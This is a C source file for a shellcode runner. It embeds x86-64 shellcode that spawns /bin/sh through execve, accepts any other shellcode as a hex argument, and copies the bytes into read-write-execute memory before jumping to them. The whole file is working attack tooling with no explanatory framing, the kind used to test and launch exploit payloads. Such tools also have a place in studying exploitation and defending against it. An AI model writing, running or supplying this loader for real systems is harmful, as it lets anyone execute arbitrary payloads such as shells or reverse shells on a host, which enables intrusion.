#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

static const uint8_t DEFAULT_SC[] = {
    0x48, 0x31, 0xff,
    0x48, 0x31, 0xf6,
    0x48, 0x31, 0xd2,
    0x48, 0x31, 0xc0,
    0x50,
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e,
              0x2f, 0x2f, 0x73, 0x68,
    0x53,
    0x48, 0x89, 0xe7,
    0xb0, 0x3b,
    0x0f, 0x05
};

static int hex_decode(const char *s, uint8_t *out, size_t max)
{
    size_t n = strlen(s);
    if (n % 2 || n / 2 > max) return -1;
    for (size_t i = 0; i < n / 2; i++) {
        char b[3] = { s[i*2], s[i*2+1], '\0' };
        out[i] = (uint8_t)strtoul(b, NULL, 16);
    }
    return (int)(n / 2);
}

int main(int argc, char *argv[])
{
    const uint8_t *sc;
    size_t sc_len;
    uint8_t sc_buf[4096];

    if (argc >= 2) {
        int n = hex_decode(argv[1], sc_buf, sizeof(sc_buf));
        if (n < 0) {         fprintf(stderr, "usage: %s [args]\n", argv[0]); return 1; }
        sc = sc_buf; sc_len = (size_t)n;
        printf("[*] %zu bytes\n", sc_len);
    } else {
        sc = DEFAULT_SC; sc_len = sizeof(DEFAULT_SC);
        printf("[*] default shellcode (execve /bin/sh): %zu bytes\n", sc_len);
    }

    size_t page = (size_t)getpagesize();
    size_t map_sz = (sc_len + page - 1) & ~(page - 1);

    void *mem = mmap(NULL, map_sz,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { perror("mmap"); return 1; }

    memcpy(mem, sc, sc_len);

    __builtin___clear_cache(mem, (char *)mem + sc_len);

    printf("[*] exec @ %p\n", mem);
    fflush(stdout);

    ((void (*)(void))mem)();

    munmap(mem, map_sz);
    return 0;
}
